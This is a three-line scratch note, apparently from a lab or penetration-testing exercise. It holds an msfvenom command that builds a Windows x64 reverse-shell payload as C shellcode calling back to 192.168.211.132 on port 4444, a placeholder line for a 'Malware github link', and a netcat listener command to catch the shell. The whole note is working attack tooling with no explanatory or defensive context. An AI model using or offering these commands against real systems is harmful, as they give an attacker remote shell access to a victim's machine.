msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.211.132 LPORT=4444 -f c 

Put Malware github link here - 

nc -lvp 4444
